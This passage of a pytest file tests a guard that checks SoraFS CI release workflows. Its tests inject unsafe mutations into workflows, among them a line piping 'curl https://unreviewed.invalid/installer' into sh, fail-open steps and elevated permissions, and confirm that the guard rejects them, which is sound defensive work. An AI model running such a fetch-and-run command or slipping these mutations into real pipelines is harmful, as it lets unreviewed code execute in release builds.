"""Adversarial tests for the SoraFS release-automation contract guard."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from scripts import check_sorafs_release_automation as automation


REPO_ROOT = Path(__file__).resolve().parents[2]


def _copy_workflows(target: Path) -> None:
    (target / "docs").mkdir(parents=True, exist_ok=True)
    for relative in (
        *automation.WORKFLOWS,
        *automation.RELEASE_DOCUMENTS,
        *automation.RELEASE_AUTH_HISTORICAL_FINDINGS,
        *automation.REFERENCE_SDK_RELEASE_EXAMPLE_REQUIRED_MARKERS,
        *automation.NATIVE_GOVERNANCE_SDK_CONTRACTS,
        *automation.RUNTIME_PROVIDER_DEPLOYMENT_ASSET_MARKERS,
        automation.PACKAGE_RELEASE_SMOKE_SCRIPT,
    ):
        source = REPO_ROOT / relative
        destination = target / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(source.read_bytes())
    for relative in automation.RELEASE_AUTH_ROOT_DOCUMENTS:
        destination = target / relative
        destination.write_text("# Release-auth test fixture\n", encoding="utf-8")


def test_validate_release_automation_accepts_repository_contract() -> None:
    summary = automation.validate_release_automation(REPO_ROOT)
    assert summary == {
        "schema": automation.SCHEMA,
        "workflow_count": 3,
        "workflows": sorted(automation.WORKFLOWS),
    }


@pytest.mark.parametrize(
    "relative",
    sorted(automation.SORAFS_CLI_TOPOLOGY_TRIGGER_PATHS),
)
def test_topology_envelope_dependency_triggers_are_mandatory(
    tmp_path: Path, relative: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    trigger = f'      - "{relative}"\n'
    assert source.count(trigger) == 1
    workflow.write_text(source.replace(trigger, "", 1), encoding="utf-8")

    with pytest.raises(
        ValueError,
        match=r"pull_request\.paths omits topology-envelope dependency trigger",
    ):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "relative",
    sorted(automation.SORAFS_CLI_VERSION_MAP_TRIGGER_PATHS),
)
def test_swift_version_map_dependency_triggers_are_mandatory(
    tmp_path: Path, relative: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    trigger = f'      - "{relative}"\n'
    assert source.count(trigger) == 1
    workflow.write_text(source.replace(trigger, "", 1), encoding="utf-8")

    with pytest.raises(
        ValueError,
        match=r"pull_request\.paths omits Swift version-map dependency trigger",
    ):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "marker",
    automation.RUNTIME_PROVIDER_RELEASE_WORKFLOW_MARKERS,
)
def test_runtime_provider_release_workflow_markers_are_mandatory(
    tmp_path: Path, marker: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    drifted = source.replace(marker, "REMOVED_RUNTIME_PROVIDER_CONTRACT", 1)
    assert drifted != source
    workflow.write_text(drifted, encoding="utf-8")

    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "relative",
    sorted(automation.RUNTIME_PROVIDER_DEPLOYMENT_ASSET_MARKERS),
)
def test_runtime_provider_deployment_asset_removal_fails_closed(
    tmp_path: Path, relative: str
) -> None:
    _copy_workflows(tmp_path)
    (tmp_path / relative).unlink()

    with pytest.raises(ValueError, match="source is missing"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (relative, marker)
        for relative, markers in sorted(
            automation.RUNTIME_PROVIDER_DEPLOYMENT_ASSET_MARKERS.items()
        )
        for marker in markers
    ],
)
def test_runtime_provider_deployment_asset_markers_are_mandatory(
    tmp_path: Path, relative: str, marker: str
) -> None:
    _copy_workflows(tmp_path)
    asset = tmp_path / relative
    source = asset.read_text(encoding="utf-8")
    # Some security invariants are intentionally enforced at more than one
    # boundary. Remove every occurrence so this mutation proves the release
    # gate requires the invariant itself, not merely one duplicated spelling.
    drifted = source.replace(marker, "REMOVED_RUNTIME_PROVIDER_ASSET_MARKER")
    assert drifted != source
    asset.write_text(drifted, encoding="utf-8")

    with pytest.raises(
        ValueError,
        match="missing runtime-provider deployment contract marker",
    ):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (relative, marker)
        for relative, markers in sorted(
            automation.RUNTIME_PROVIDER_DEPLOYMENT_FORBIDDEN_MARKERS.items()
        )
        for marker in markers
    ],
)
def test_runtime_provider_deployment_assets_reject_credential_or_override_inputs(
    tmp_path: Path, relative: str, marker: str
) -> None:
    _copy_workflows(tmp_path)
    asset = tmp_path / relative
    with asset.open("a", encoding="utf-8") as destination:
        destination.write(f"\n{marker}\n")

    with pytest.raises(
        ValueError,
        match="forbidden runtime-provider deployment marker",
    ):
        automation.validate_release_automation(tmp_path)


def test_pop_broker_hard_cut_contract_accepts_repository() -> None:
    assert automation._validate_pop_broker_hard_cut_contract(REPO_ROOT) == []


def test_pop_broker_operation_60_cannot_be_reassigned(tmp_path: Path) -> None:
    _copy_workflows(tmp_path)
    protocol = (
        tmp_path
        / "crates/irohad/src/runtime_provider_broker/protocol_primitives.rs"
    )
    with protocol.open("a", encoding="utf-8") as destination:
        destination.write(
            "\npub(super) const OPERATION_POP_RETIRED_TEST_V1: u16 = 60;\n"
        )

    with pytest.raises(ValueError, match="operation 60/runtime resolve must remain retired"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "struct_name",
    sorted(automation.POP_BROKER_WIRE_FIELD_INVENTORIES),
)
def test_pop_broker_wire_structs_reject_private_recipient_fields(
    tmp_path: Path, struct_name: str
) -> None:
    _copy_workflows(tmp_path)
    protocol = (
        tmp_path
        / "crates/irohad/src/runtime_provider_broker/protocol_primitives.rs"
    )
    source = protocol.read_text(encoding="utf-8")
    declaration = f"struct {struct_name} {{"
    drifted = source.replace(
        declaration,
        f"{declaration}\n    recipient_private_key: Vec<u8>,",
        1,
    )
    assert drifted != source
    protocol.write_text(drifted, encoding="utf-8")

    with pytest.raises(ValueError, match=rf"wire struct {struct_name} fields must be exactly"):
        automation.validate_release_automation(tmp_path)


def test_pop_broker_wire_structs_reject_field_type_substitution(tmp_path: Path) -> None:
    _copy_workflows(tmp_path)
    protocol = (
        tmp_path
        / "crates/irohad/src/runtime_provider_broker/protocol_primitives.rs"
    )
    source = protocol.read_text(encoding="utf-8")
    drifted = source.replace(
        "issuer_public_key: [u8; 32],",
        "issuer_public_key: Vec<u8>,",
        1,
    )
    assert drifted != source
    protocol.write_text(drifted, encoding="utf-8")

    with pytest.raises(
        ValueError,
        match="wire struct PopRuntimeOpenResultWireV1 fields must be exactly",
    ):
        automation.validate_release_automation(tmp_path)


def test_pop_runtime_production_source_rejects_private_recipient_material(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    runtime = tmp_path / "crates/irohad/src/sorafs_pop_runtime.rs"
    source = runtime.read_text(encoding="utf-8")
    drifted = source.replace(
        "#[cfg(test)]",
        "type LeakedRecipient = iroha_crypto::HybridSecretKey;\n\n#[cfg(test)]",
        1,
    )
    assert drifted != source
    runtime.write_text(drifted, encoding="utf-8")

    with pytest.raises(
        ValueError,
        match="production PoP runtime must not own private recipient material",
    ):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("original", "replacement"),
    [
        (
            "python3 scripts/check_sorafs_release_version_map.py | tee "
            "version-map-summary.replay.json",
            "printf '{}\\n' | tee version-map-summary.replay.json",
        ),
        (
            "cmp version-map-summary.first.json version-map-summary.replay.json",
            "true # removed version-map replay comparison",
        ),
    ],
)
def test_release_gate_requires_byte_identical_version_map_double_run(
    tmp_path: Path,
    original: str,
    replacement: str,
) -> None:
    """The release version cannot come from a single or unchecked map pass."""

    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert original in source
    workflow.write_text(source.replace(original, replacement, 1), encoding="utf-8")

    with pytest.raises(ValueError, match="version map must be validated exactly twice"):
        automation.validate_release_automation(tmp_path)


def test_csharp_ci_requires_native_sorafs_governance_validation() -> None:
    workflow = (
        REPO_ROOT / ".github" / "workflows" / "pr_csharp.yml"
    ).read_text(encoding="utf-8")
    validator_tests = (
        REPO_ROOT
        / "csharp"
        / "tests"
        / "Hyperledger.Iroha.Sdk.Tests"
        / "SoraFsReferenceValidatorsTests.cs"
    ).read_text(encoding="utf-8")

    assert 'IROHA_REQUIRE_SORAFS_NATIVE_VALIDATION: "1"' in workflow
    assert (
        "LD_LIBRARY_PATH: ${{ runner.temp }}/csharp-native-package/"
        "runtimes/linux-x64/native"
    ) in workflow
    assert (
        'cargo build --locked --release -p connect_norito_bridge --target "$target"'
        in workflow
    )
    assert "package_csharp_native_artifacts.py stage" in workflow
    assert "package_csharp_native_artifacts.py verify-package" in workflow
    assert "dotnet test Hyperledger.Iroha.Sdk.sln" in workflow
    assert "IROHA_REQUIRE_SORAFS_NATIVE_VALIDATION" not in validator_tests
    assert "WhenAvailable" not in validator_tests
    assert "Assert.True(" in validator_tests
    assert (
        "ABI-22 connect_norito_bridge with Governance DAG symbols is required."
        in validator_tests
    )


@pytest.mark.parametrize(
    "relative",
    [
        automation.MOBILE_SDK_ARTIFACTS_WORKFLOW,
    ],
)
def test_native_governance_sdk_contract_requires_fail_closed_environment(
    tmp_path: Path,
    relative: str,
) -> None:
    _copy_workflows(tmp_path)
    target = tmp_path / relative
    source = target.read_text(encoding="utf-8")
    drifted = source.replace(
        automation.NATIVE_GOVERNANCE_VALIDATION_REQUIRED_ENV,
        "REMOVED_NATIVE_GOVERNANCE_REQUIREMENT",
    )
    assert drifted != source
    target.write_text(drifted, encoding="utf-8")

    with pytest.raises(ValueError, match="native Governance DAG"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "marker",
    automation.JAVA_GOVERNANCE_WORKFLOW_STEP_MARKERS,
)
def test_java_governance_validator_uses_external_writable_gradle_state(
    tmp_path: Path,
    marker: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / automation.MOBILE_SDK_ARTIFACTS_WORKFLOW
    source = workflow.read_text(encoding="utf-8")
    start = source.index(automation.JAVA_GOVERNANCE_WORKFLOW_STEP_NAME)
    end = source.index("name: Validate Android mobile SDK artifact", start)
    section = source[start:end]
    assert marker in section
    drifted_section = section.replace(marker, "REMOVED_EXTERNAL_STATE", 1)
    workflow.write_text(
        source[:start] + drifted_section + source[end:],
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="Governance DAG"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "required_call", "unconditional_skip"),
    [
        (
            automation.SWIFT_GOVERNANCE_VALIDATOR_TEST,
            (
                "        guard try requireGovernanceDagNativeBridge() else {\n"
                "            return\n"
                "        }\n"
            ),
            (
                "        try XCTSkipIf(\n"
                "            !SorafsReferenceValidators.isGovernanceDagNativeAvailable,\n"
                '            "SoraFS governance DAG reference bridge unavailable"\n'
                "        )\n"
            ),
        ),
        (
            automation.KOTLIN_GOVERNANCE_VALIDATOR_TEST,
            "        requireGovernanceDagNativeBridge()\n",
            (
                "        assumeTrue("
                "SorafsReferenceValidators.isNativeAvailable(), "
                '"connect_norito_bridge not available")\n'
            ),
        ),
        (
            automation.JAVA_GOVERNANCE_VALIDATOR_TEST,
            (
                "  private static void "
                "validatesGovernanceDagFixturesAndNegativeVectorsWhenNativeBridgeIsAvailable()\n"
                "      throws IOException {\n"
                "    requireNativeBridge();\n"
            ),
            (
                "  private static void "
                "validatesGovernanceDagFixturesAndNegativeVectorsWhenNativeBridgeIsAvailable()\n"
                "      throws IOException {\n"
                "    if (!SorafsReferenceValidators.isNativeAvailable()) {\n"
                "      return;\n"
                "    }\n"
            ),
        ),
    ],
)
def test_native_governance_sdk_contract_rejects_unconditional_skip(
    tmp_path: Path,
    relative: str,
    required_call: str,
    unconditional_skip: str,
) -> None:
    _copy_workflows(tmp_path)
    target = tmp_path / relative
    source = target.read_text(encoding="utf-8")
    drifted = source.replace(required_call, unconditional_skip, 1)
    assert drifted != source
    target.write_text(drifted, encoding="utf-8")

    with pytest.raises(ValueError, match="Governance DAG"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (".github/workflows/sorafs-cli-release.yml", "run: bash ci/check_sorafs_cli_release.sh"),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "python3 scripts/check_workflow_action_pins.py",
        ),
        (".github/workflows/sorafs-cli-release.yml", "cosign sign-blob --yes --bundle"),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Verify platform package checksums before signing",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "actions/attest@a1948c3f048ba23858d222213b7c278aabede763",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "anchore/sbom-action@e22c389904149dbc22b58101806040fa8d37a610",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "anchore/scan-action@e1165082ffb1fe366ebaf02d8526e7c4989ea9d2",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "SHA256SUMS does not cover the exact platform candidate file set",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "grype-version: v0.112.0",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Rebuild deterministic platform archive and run clean-consumer smoke",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Stage source release scan evidence",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "specs/sorafs/runbooks/release_rollback_yank.md "
            "artifacts/sorafs-cli/ROLLBACK-YANK.md",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/build_release_bundle.sh"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/release_profile_validation_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Verify the protected external Ed25519 manifest tuple",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Verify authenticated release-manifest candidate binding before provenance",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/build_sorafs_reference_sdk_supply_chain_sources.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/build_sorafs_foundational_prerequisite.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/build_sorafs_topology_qualification_envelope.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/sorafs_software_signer_receipt.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/sorafs_topology_qualification.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/sorafs_evidence_json.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/sorafs_response_args.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/build_sorafs_reference_sdk_supply_chain_sources_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/build_sorafs_foundational_prerequisite_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/sorafs_topology_qualification_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/sorafs_evidence_json_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/tests/sorafs_response_args_test.py"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "scripts/examples/sorafs_l1_topology_qualification_envelope.md"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "specs/sorafs/l1_deployment_qualification.md"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Assemble and validate the canonical SF-11 source indexes",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Build and gate source-derived SF-11 supply-chain evidence",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "expected one aggregate offline provenance bundle",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Attest aggregate signed-input provenance",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '"signed-input/github-attestations/${target}.json"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            'gh attestation verify "$provenance_file"',
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "realpath -e --",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "SORAFS_TRUSTED_GH_CLI_SHA256: ${{ vars.SORAFS_TRUSTED_GH_CLI_SHA256 }}",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            "name: Upload replay-complete SF-11 supply-chain evidence",
        ),
        (
            ".github/workflows/sorafs-cli-release.yml",
            '- "specs/release_dual_track_automation_plan*.md"',
        ),
        (
            ".github/workflows/sorafs-fixtures-nightly.yml",
            "bash ci/check_sorafs_fixtures.sh",
        ),
        (
            ".github/workflows/sorafs-fixtures-nightly.yml",
            "actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16",
        ),
        (".github/workflows/sorafs-orchestrator-sdk.yml", "runs-on: macos-14"),
        (".github/workflows/sorafs-orchestrator-sdk.yml", "bash ci/sdk_sorafs_orchestrator.sh"),
        (".github/workflows/sorafs-orchestrator-sdk.yml", "  mobile-parity:"),
        (".github/workflows/sorafs-orchestrator-sdk.yml", "  csharp-parity:"),
        (".github/workflows/sorafs-orchestrator-sdk.yml", '- ".cargo/**"'),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            '- "scripts/package_mobile_sdk_artifacts.sh"',
        ),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            "bash ci/check_kagemusha_jvm_native_bridge.sh",
        ),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            "check_native_sdk_abi22_artifact.py verify",
        ),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            "Build and authenticate the exact ABI-22 C# bridge",
        ),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            'sdkmanager_status="${PIPESTATUS[1]}"',
        ),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            "dotnet restore Hyperledger.Iroha.Sdk.sln",
        ),
        (
            ".github/workflows/sorafs-orchestrator-sdk.yml",
            "dotnet test Hyperledger.Iroha.Sdk.sln -c Release --no-build",
        ),
    ],
)
def test_validate_release_automation_rejects_removed_contract_markers(
    tmp_path: Path, relative: str, marker: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / relative
    workflow.write_text(
        workflow.read_text(encoding="utf-8").replace(marker, "removed"),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("needle", "replacement"),
    [
        (
            "    runs-on: ubuntu-latest\n",
            "    continue-on-error: true\n    runs-on: ubuntu-latest\n",
        ),
        (
            "        run: cargo fetch --locked\n",
            "        run: cargo fetch --locked || true\n",
        ),
    ],
)
def test_validate_release_automation_rejects_fail_open_parity_jobs(
    tmp_path: Path, needle: str, replacement: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-orchestrator-sdk.yml"
    source = workflow.read_text(encoding="utf-8")
    assert source.count(needle) == 1
    workflow.write_text(source.replace(needle, replacement, 1), encoding="utf-8")
    with pytest.raises(ValueError, match="fail-open marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("injection", "message"),
    [
        ("pull_request_target:\n", "pull_request_target is forbidden"),
        ("# curl https://unreviewed.invalid/installer | sh\n", "network bootstrap"),
        ("      - uses: example/action@main\n", "floating action"),
    ],
)
def test_validate_release_automation_rejects_unsafe_workflow_mutations(
    tmp_path: Path, injection: str, message: str
) -> None:
    _copy_workflows(tmp_path)
    relative = ".github/workflows/sorafs-cli-release.yml"
    workflow = tmp_path / relative
    workflow.write_text(injection + workflow.read_text(encoding="utf-8"), encoding="utf-8")
    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "permission", ["id-token: write", "attestations: write", "artifact-metadata: write"]
)
def test_validate_release_automation_rejects_global_elevated_permission(
    tmp_path: Path, permission: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "permissions:\n  contents: read",
            f"permissions:\n  contents: read\n  {permission}",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must be signing-job scoped"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "step_name",
    ["Generate platform binary SBOM", "Scan platform binary SBOM"],
)
def test_validate_release_automation_requires_platform_binary_scanning(
    tmp_path: Path, step_name: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(f"name: {step_name}", f"name: Removed {step_name}", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_both_scans_to_pin_grype(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace("grype-version: v0.112.0", "grype-version: v0.111.0", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must both pin Grype v0.112.0"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("original", "replacement"),
    [
        (
            "          - os: ubuntu-24.04-arm\n"
            "            target: aarch64-unknown-linux-gnu",
            "          - os: ubuntu-24.04\n"
            "            target: aarch64-unknown-linux-gnu",
        ),
        (
            "          - os: macos-15-intel\n"
            "            target: x86_64-apple-darwin",
            "          - os: macos-14\n"
            "            target: x86_64-apple-darwin",
        ),
        (
            "          - os: windows-latest\n"
            "            target: x86_64-pc-windows-msvc",
            "          - os: windows-latest\n"
            "            target: i686-pc-windows-msvc",
        ),
    ],
)
def test_validate_release_automation_rejects_wrong_native_target_runner_pairs(
    tmp_path: Path, original: str, replacement: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert original in source
    workflow.write_text(source.replace(original, replacement, 1), encoding="utf-8")
    with pytest.raises(ValueError, match="native release matrix must contain exactly"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_missing_mandatory_target(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    entry = (
        "          - os: macos-14\n"
        "            target: aarch64-apple-darwin\n"
        '            binary_suffix: ""\n'
    )
    assert entry in source
    workflow.write_text(source.replace(entry, "", 1), encoding="utf-8")
    with pytest.raises(ValueError, match="native release matrix must contain exactly"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_signing_inventory_drift(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "            aarch64-apple-darwin\n"
            "            x86_64-pc-windows-msvc\n",
            "            aarch64-apple-darwin\n"
            "            i686-pc-windows-msvc\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="target inventory must exactly match"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_promotion_auth_bypass(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "needs: [release-gate, package, verify-release-auth]",
            "needs: [release-gate, package]",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(
        ValueError,
        match="release promotion must depend on protected Ed25519",
    ):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_alternate_promotion_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    workflow.write_text(
        workflow.read_text(encoding="utf-8")
        + "\n"
        + "  bypass-promotion:\n"
        + "    runs-on: ubuntu-latest\n"
        + "    steps: []\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="job inventory must be exactly"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("binding", "message"),
    [
        (
            "SORAFS_REFERENCE_SDK_DEPLOYMENT_ID: "
            "${{ vars.SORAFS_REFERENCE_SDK_DEPLOYMENT_ID }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_REFERENCE_SDK_RECEIPTS_ROOT: "
            "${{ vars.SORAFS_REFERENCE_SDK_RECEIPTS_ROOT }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_PROVENANCE_VERIFICATION_PUBLIC_KEY_HEX: "
            "${{ vars.SORAFS_PROVENANCE_VERIFICATION_PUBLIC_KEY_HEX }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_TRUSTED_GH_CLI_SHA256: "
            "${{ vars.SORAFS_TRUSTED_GH_CLI_SHA256 }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_SUMMARY_PATH: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_SUMMARY_PATH }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_ENVELOPE_PATH: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_ENVELOPE_PATH }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_VERIFICATION_PUBLIC_KEY_HEX: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_VERIFICATION_PUBLIC_KEY_HEX }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_SERVICE_ID: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_SERVICE_ID }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_ADMINISTRATOR_ID: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_ADMINISTRATOR_ID }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_KEY_REVISION: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_KEY_REVISION }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_POLICY_REVISION: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_POLICY_REVISION }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_POLICY_DIGEST_HEX: "
            "${{ vars.SORAFS_L1_TOPOLOGY_QUALIFICATION_SIGNER_POLICY_DIGEST_HEX }}",
            "external receipt, topology, or public-key binding",
        ),
        (
            "--supply-chain-source-root sf11-source",
            "source root and exact public provenance trust tuple",
        ),
        (
            '--provenance-certificate-identity "$certificate_identity"',
            "source root and exact public provenance trust tuple",
        ),
        (
            '--provenance-oidc-issuer "$oidc_issuer"',
            "source root and exact public provenance trust tuple",
        ),
    ],
)
def test_validate_release_automation_rejects_source_evidence_binding_drift(
    tmp_path: Path,
    binding: str,
    message: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert binding in source
    workflow.write_text(
        source.replace(binding, "REMOVED_SOURCE_BINDING", 1),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_source_evidence_job_reordering(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    original = (
        "name: Reverify exact target provenance before source assembly"
    )
    replacement = (
        "name: Temporarily moved target provenance verification"
    )
    source = source.replace(original, replacement, 1)
    source = source.replace(
        "name: Assemble and validate the canonical SF-11 source indexes",
        "name: Assemble and validate the canonical SF-11 source indexes\n"
        f"      - name: {original}",
        1,
    )
    workflow.write_text(source, encoding="utf-8")

    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_source_target_order_drift(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    job_start = source.index("  reference-sdk-supply-chain-evidence:\n")
    job = source[job_start:]
    original = (
        "            x86_64-apple-darwin\n"
        "            aarch64-apple-darwin\n"
    )
    replacement = (
        "            aarch64-apple-darwin\n"
        "            x86_64-apple-darwin\n"
    )
    assert original in job
    workflow.write_text(
        source[:job_start] + job.replace(original, replacement, 1),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="canonical source order"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
